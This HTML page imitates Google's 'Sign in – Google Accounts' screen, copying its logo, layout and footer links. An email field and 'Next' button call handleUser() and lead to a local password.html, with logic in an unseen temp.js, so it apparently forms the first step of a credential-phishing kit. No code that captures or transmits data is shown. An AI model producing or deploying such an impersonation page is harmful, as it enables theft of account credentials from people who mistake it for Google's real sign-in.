<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in â€“ Google Accounts</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f1f3f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background-color: white;
      width: 450px;
      border-radius: 8px;
      padding: 40px;
      box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 8px;
    }
    .subtitle {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 30px;
    }
    input[type="email"] {
      width: 100%;
      padding: 14px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      transition: border 0.2s, box-shadow 0.2s;
    }
    input[type="email"]:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .link {
      color: #1a73e8;
      font-size: 14px;
      text-decoration: none;
      display: block;
      margin: 8px 0 24px;
      cursor: pointer;
    }
    .info {
      font-size: 13px;
      color: #5f6368;
      margin-bottom: 24px;
    }
    .info a {
      color: #1a73e8;
      text-decoration: none;
    }
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 16px;
    }
    .actions a {
      font-size: 14px;
      text-decoration: none;
      color: #1a73e8;
      cursor: pointer;
    }
    .actions button {
      background-color: #1a73e8;
      border: none;
      color: white;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 20px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .actions button:hover {
      background-color: #1669c1;
    }
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 40px;
      font-size: 12px;
      color: #5f6368;
    }
    .footer a {
      color: #5f6368;
      text-decoration: none;
      margin-left: 12px;
      cursor: pointer;
    }
    .footer-left {
      flex: 1;
    }
    .footer-right {
      display: flex;
    }
    .message {
      margin-top: 16px;
      font-size: 14px;
      color: red;
      display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <div>
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" class="logo" alt="Google Logo" />
      <h1>Sign in</h1>
      <div class="subtitle">to continue to you're account</div>
      <input type="email" id="userInput" placeholder="Email or phone" />
      <a class="link" href="https://accounts.google.com/signin/v2/usernamerecovery?checkedDomains=youtube&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Den%26next%3Dhttps%253A%252F%252Fwww.youtube.com%252F&dsh=S1880311728%3A1750011922273029&ec=65620&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&ifkv=AdBytiMYe-PNQvFkuJnUTydrVs8g7oRXnOLYRxmbWgIA4aW2U0OWs30_pqHwTW7_cocTg1wHrLtNYA&pstMsg=1&service=youtube">Forgot email?</a>
      <div class="info">
        Not your computer? Use Guest mode to sign in privately.
        <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank">
          Learn more about using Guest mode
        </a>

      </div>
      <div class="actions">
        <a href="https://accounts.google.com/lifecycle/steps/signup/name?checkedDomains=youtube&continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Den%26next%3Dhttps%253A%252F%252Fwww.youtube.com%252F&dsh=S1880311728:1750015884932660&ec=65620&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&ifkv=AdBytiMFyjaGoYWKaSjTkU2QniwhO3-EYy17nlTNQhB-2a1Pb1weZQGk-_v4G0RQD5KbBuXk6fvtVA&pstMsg=1&service=youtube&TL=ALgCv6xqORJHf_tt5pcKMCYrBJGj3QklM3LPD_N-9udChQtmd81sddU3WE5_wJhL">Create account</a>
        <a href="password.html" onclick="handleUser()"><button>Next</button></a>
      </div>
      <div class="message" id="messageBox"></div>
    </div>
    <div class="footer">
      <div class="footer-left">English (United States)</div>
      <div class="footer-right">
        <a href="https://support.google.com/accounts?hl=en&visit_id=638856154504280228-1720699841&rd=2&p=account_iph#topic=3382296" target="_blank">Help</a>
        <a href="https://policies.google.com/privacy?gl=IN&hl=en" target="_blank">Privacy</a>
        <a href="https://policies.google.com/terms?gl=IN&hl=en" target="_blank">Terms</a>
      </div>
    </div>
  </div>

<script src="temp.js"></script>
</body>
</html>
